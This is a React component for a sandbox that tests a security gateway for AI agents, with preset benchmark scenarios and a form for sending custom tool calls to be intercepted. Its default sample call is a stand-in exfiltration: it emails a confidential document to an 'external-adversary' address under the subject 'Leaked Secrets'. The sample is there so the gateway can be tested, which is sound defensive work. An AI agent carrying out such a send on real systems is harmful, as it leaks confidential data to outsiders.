import React, { useState } from 'react';
import { 
  Play, 
  Cpu, 
  Send, 
  Clock, 
  Sparkles, 
  Terminal
} from 'lucide-react';
import type { Scenario } from '../types';
import { DecisionBadge, RiskBadge } from '../components/Badges';
import { runScenario, interceptDirectAction } from '../api';

interface AgentSimulatorViewProps {
  scenarios: Scenario[];
  onRefreshData: () => void;
}

export const AgentSimulatorView: React.FC<AgentSimulatorViewProps> = ({
  scenarios,
  onRefreshData,
}) => {
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>(
    scenarios[0]?.id || 'scenario_1_authorized_doc_read'
  );
  const [isRunning, setIsRunning] = useState<boolean>(false);
  const [simResults, setSimResults] = useState<any | null>(null);

  // Manual Interactive Interceptor Playground State
  const [manualAgentId, setManualAgentId] = useState('agent-analyst-01');
  const [manualAgentRole, setManualAgentRole] = useState('data_analyst');
  const [manualTool, setManualTool] = useState('email_tool');
  const [manualOp, setManualOp] = useState('send_email');
  const [manualParams, setManualParams] = useState(
    JSON.stringify(
      {
        recipient: 'leak@external-adversary.com',
        subject: 'Leaked Secrets',
        attachment_ids: ['doc-conf-88']
      },
      null,
      2
    )
  );
  const [manualSensitivity, setManualSensitivity] = useState<'PUBLIC' | 'INTERNAL' | 'RESTRICTED' | 'CONFIDENTIAL'>('CONFIDENTIAL');
  const [manualReversible, setManualReversible] = useState(false);
  const [manualResult, setManualResult] = useState<any | null>(null);
  const [manualLoading, setManualLoading] = useState(false);

  const handleRunPreset = async () => {
    setIsRunning(true);
    setSimResults(null);
    try {
      const data = await runScenario(selectedScenarioId);
      setSimResults(data);
      onRefreshData();
    } catch (err: any) {
      console.error('Failed to run scenario', err);
      alert('Error running scenario: ' + (err.response?.data?.detail || err.message));
    } finally {
      setIsRunning(false);
    }
  };

  const handleRunManual = async (e: React.FormEvent) => {
    e.preventDefault();
    setManualLoading(true);
    setManualResult(null);
    try {
      let parsedParams = {};
      try {
        parsedParams = JSON.parse(manualParams);
      } catch (e) {
        alert('Invalid JSON parameters');
        setManualLoading(false);
        return;
      }

      const payload = {
        agent_id: manualAgentId,
        agent_role: manualAgentRole,
        tool_name: manualTool,
        operation: manualOp,
        parameters: parsedParams,
        sensitivity_level: manualSensitivity,
        is_reversible: manualReversible,
        resource_id: 'res-manual-test'
      };

      const res = await interceptDirectAction(payload);
      setManualResult(res);
      onRefreshData();
    } catch (err: any) {
      console.error('Manual action interception failed', err);
      alert('Interception failed: ' + (err.response?.data?.detail || err.message));
    } finally {
      setManualLoading(false);
    }
  };

  const currentScenario = scenarios.find((s) => s.id === selectedScenarioId) || scenarios[0];

  return (
    <div className="space-y-8">
      {/* Header */}
      <div>
        <h2 className="text-xl font-bold text-white flex items-center gap-2">
          <Cpu className="w-5 h-5 text-indigo-400" />
          Deterministic AI Agent Simulator &amp; Interceptor Sandbox
        </h2>
        <p className="text-sm text-slate-400 mt-1">
          Simulate realistic, multi-step agent tool requests or formulate custom tool calls to observe gateway interception in real-time.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Preset Scenarios Panel */}
        <div className="lg:col-span-7 space-y-6">
          <div className="p-6 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-5">
            <div className="flex items-center justify-between">
              <h3 className="text-base font-semibold text-white flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-cyan-400" />
                Benchmark Scenarios
              </h3>
              <span className="text-xs text-slate-400">4 Reproducible Test Cases</span>
            </div>

            <div className="space-y-3">
              {scenarios.map((sc) => {
                const isSelected = sc.id === selectedScenarioId;
                return (
                  <div
                    key={sc.id}
                    onClick={() => setSelectedScenarioId(sc.id)}
                    className={`p-4 rounded-xl cursor-pointer border transition-all ${
                      isSelected
                        ? 'bg-indigo-950/40 border-indigo-500/60 shadow-lg shadow-indigo-950/50'
                        : 'bg-slate-800/30 border-slate-700/50 hover:bg-slate-800/60 hover:border-slate-600'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <h4 className="text-sm font-semibold text-white">{sc.name}</h4>
                      <DecisionBadge decision={sc.expected_decision} />
                    </div>
                    <p className="text-xs text-slate-400 mt-1.5">{sc.description}</p>
                    <div className="mt-2.5 flex items-center gap-4 text-[11px] text-slate-500">
                      <span>Actions: <strong>{sc.actions?.length || 1}</strong></span>
                      <span>Target: <strong>{sc.actions?.[0]?.tool_name}</strong></span>
                      <span>Category: <strong>{sc.category}</strong></span>
                    </div>
                  </div>
                );
              })}
            </div>

            <button
              onClick={handleRunPreset}
              disabled={isRunning}
              className="w-full flex items-center justify-center gap-2 py-3 px-4 rounded-xl bg-gradient-to-r from-indigo-500 to-cyan-500 text-white font-medium text-sm shadow-lg shadow-indigo-500/25 hover:opacity-95 transition-all disabled:opacity-50"
            >
              <Play className="w-4 h-4 fill-white" />
              {isRunning ? 'Intercepting & Evaluating...' : `Simulate "${currentScenario?.name || 'Scenario'}"`}
            </button>
          </div>

          {/* Results Stream */}
          {simResults && (
            <div className="p-6 rounded-2xl bg-slate-900/90 border border-slate-800 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                <div>
                  <h4 className="text-sm font-bold text-white">Simulation Execution Results</h4>
                  <span className="text-xs text-slate-400">Session ID: {simResults.session_id}</span>
                </div>
                <span className="text-xs px-2.5 py-1 rounded bg-slate-800 font-mono text-cyan-300">
                  {simResults.total_steps} step(s) evaluated
                </span>
              </div>

              <div className="space-y-3">
                {simResults.results.map((r: any, idx: number) => (
                  <div
                    key={idx}
                    className={`p-4 rounded-xl border ${
                      r.decision === 'BLOCK'
                        ? 'bg-rose-950/20 border-rose-500/40'
                        : r.decision === 'REQUIRE_APPROVAL'
                        ? 'bg-amber-950/20 border-amber-500/40'
                        : 'bg-emerald-950/20 border-emerald-500/40'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-mono font-bold text-slate-400">Step {r.step}:</span>
                        <span className="text-xs font-semibold text-white">{r.tool_name} :: {r.operation}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <RiskBadge level={r.risk_level} score={r.risk_score} />
                        <DecisionBadge decision={r.decision} />
                      </div>
                    </div>

                    <p className="text-xs text-slate-300 mt-2 font-mono">{r.explanation}</p>

                    <div className="mt-3 pt-2.5 border-t border-slate-800/80 flex flex-wrap items-center justify-between text-[11px] text-slate-400 gap-2">
                      <div className="flex items-center gap-3">
                        <span>Agent: <strong className="text-slate-300">{r.agent_id}</strong></span>
                        <span>Status: <strong className="text-slate-300">{r.status}</strong></span>
                      </div>
                      <div className="flex items-center gap-2 font-mono">
                        <Clock className="w-3 h-3 text-cyan-400" />
                        <span>Latency: {r.latency_ms} ms</span>
                      </div>
                    </div>

                    {r.tool_executed && r.tool_result && (
                      <div className="mt-2.5 p-2 rounded bg-slate-950/70 border border-slate-800 text-[11px] font-mono text-emerald-400">
                        Mock Tool Output: {JSON.stringify(r.tool_result)}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Custom Action Playground Panel */}
        <div className="lg:col-span-5 space-y-6">
          <div className="p-6 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-5">
            <div className="flex items-center justify-between">
              <h3 className="text-base font-semibold text-white flex items-center gap-2">
                <Terminal className="w-4 h-4 text-indigo-400" />
                Custom Tool Action Injector
              </h3>
              <span className="text-xs text-slate-400">Live Interception</span>
            </div>

            <form onSubmit={handleRunManual} className="space-y-4">
              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Agent Identifier &amp; Role</label>
                <div className="grid grid-cols-2 gap-2">
                  <input
                    type="text"
                    value={manualAgentId}
                    onChange={(e) => setManualAgentId(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                    placeholder="agent-id"
                  />
                  <input
                    type="text"
                    value={manualAgentRole}
                    onChange={(e) => setManualAgentRole(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                    placeholder="role"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-400 mb-1">Target Business Tool &amp; Operation</label>
                <div className="grid grid-cols-2 gap-2">
                  <select
                    value={manualTool}
                    onChange={(e) => setManualTool(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                  >
                    <option value="email_tool">email_tool</option>
                    <option value="database_tool">database_tool</option>
                    <option value="document_tool">document_tool</option>
                    <option value="file_tool">file_tool</option>
                  </select>
                  <input
                    type="text"
                    value={manualOp}
                    onChange={(e) => setManualOp(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                    placeholder="operation"
                  />
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-1">
                  <label className="text-xs font-medium text-slate-400">Parameters (JSON)</label>
                  <span className="text-[10px] text-slate-500">Dict passed to tool</span>
                </div>
                <textarea
                  rows={4}
                  value={manualParams}
                  onChange={(e) => setManualParams(e.target.value)}
                  className="w-full p-2.5 rounded-lg bg-slate-950 font-mono text-xs text-indigo-300 border border-slate-700 focus:outline-none focus:border-indigo-500"
                />
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1">Sensitivity Level</label>
                  <select
                    value={manualSensitivity}
                    onChange={(e: any) => setManualSensitivity(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                  >
                    <option value="PUBLIC">PUBLIC</option>
                    <option value="INTERNAL">INTERNAL</option>
                    <option value="RESTRICTED">RESTRICTED</option>
                    <option value="CONFIDENTIAL">CONFIDENTIAL</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-slate-400 mb-1">Is Reversible?</label>
                  <select
                    value={manualReversible ? 'true' : 'false'}
                    onChange={(e) => setManualReversible(e.target.value === 'true')}
                    className="w-full px-3 py-2 rounded-lg bg-slate-800 border border-slate-700 text-xs text-slate-200 focus:outline-none focus:border-indigo-500"
                  >
                    <option value="true">Yes (Reversible)</option>
                    <option value="false">No (Irreversible)</option>
                  </select>
                </div>
              </div>

              <button
                type="submit"
                disabled={manualLoading}
                className="w-full flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-xs shadow-md transition-all disabled:opacity-50"
              >
                <Send className="w-3.5 h-3.5" />
                {manualLoading ? 'Intercepting...' : 'Dispatch Action to Gateway'}
              </button>
            </form>
          </div>

          {/* Manual Result Card */}
          {manualResult && (
            <div className={`p-5 rounded-2xl border ${
              manualResult.decision === 'BLOCK'
                ? 'bg-rose-950/30 border-rose-500/50'
                : manualResult.decision === 'REQUIRE_APPROVAL'
                ? 'bg-amber-950/30 border-amber-500/50'
                : 'bg-emerald-950/30 border-emerald-500/50'
            }`}>
              <div className="flex items-center justify-between">
                <span className="text-xs font-bold text-white">Gateway Interceptor Response</span>
                <DecisionBadge decision={manualResult.decision} />
              </div>
              <p className="text-xs text-slate-300 mt-2 font-mono">{manualResult.explanation}</p>
              
              <div className="mt-3 flex items-center justify-between text-xs text-slate-400">
                <span>Risk: <strong className="text-white">{manualResult.risk_score} ({manualResult.risk_level})</strong></span>
                <span>Latency: <strong className="text-cyan-400">{manualResult.latency_ms} ms</strong></span>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
